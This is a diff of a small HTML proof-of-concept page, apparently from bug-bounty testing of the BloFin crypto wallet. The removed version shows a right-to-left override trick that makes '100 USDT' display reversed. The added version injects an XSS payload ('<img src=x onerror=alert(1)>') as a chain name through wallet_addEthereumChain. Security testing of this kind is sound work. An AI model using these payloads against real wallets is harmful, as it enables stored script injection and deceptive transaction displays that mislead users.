@@ -1,23 +1,31 @@
 <!DOCTYPE html>
 <html>
 <body style="background:black;color:white;padding:15px;font-family:monospace">
-<h3>RTL Display Test - 0x403for</h3>
-<div id="test" style="font-size:20px;border:1px solid cyan;padding:10px"></div>
-<div id="log" style="color:yellow;margin-top:10px"></div>
+<h3>Chain Name XSS Test - 0x403for</h3>
+<button id="btn" style="padding:12px;background:#f5c518;color:black;font-weight:bold;border:none;border-radius:8px;width:100%">TEST ADD CHAIN XSS</button>
+<div id="log" style="color:cyan;margin-top:10px;word-break:break-all"></div>
+
 <script>
-const rtl = '\u202E';
-const normal = '100 USDT';
-const spoofed = '100' + rtl + 'TSU';
-
-document.getElementById('test').innerText = 'Normal: ' + normal + '\nSpoofed: ' + spoofed;
-document.getElementById('log').innerText = 
-  'Jika di layar atas:\n' +
-  'Normal tetap 100 USDT\n' +
-  'Spoofed kebalik jadi TSU 001 = Browser render RTL\n\n' +
-  'Sekarang coba copy-paste teks Spoofed ini ke memo / ENS name di BloFin, apakah di popup BloFin juga kebalik?';
-
-console.log('Normal bytes:', [...normal]);
-console.log('Spoofed bytes:', [...spoofed].map(c => c.charCodeAt(0).toString(16)));
+document.getElementById('btn').onclick = async () => {
+  const log = (t) => document.getElementById('log').innerHTML += t + "<br>";
+  log("Calling wallet_addEthereumChain...");
+  try {
+    await window.ethereum.request({
+      method: 'wallet_addEthereumChain',
+      params: [{
+        chainId: '0x12349',
+        chainName: '0x403for<img src=x onerror=alert(1)>',
+        nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+        rpcUrls: ['https://example.com'],
+        blockExplorerUrls: ['https://example.com']
+      }]
+    });
+    log("SUCCESS - Chain added. Sekarang tutup DApp Browser, buka BloFin > Settings > Networks");
+    log("Lihat apakah nama chain jadi <img> atau alert(1) muncul di Settings BloFin.");
+  } catch(e) {
+    log("Error / Rejected: " + e.message);
+  }
+};
 </script>
 </body>
 </html>
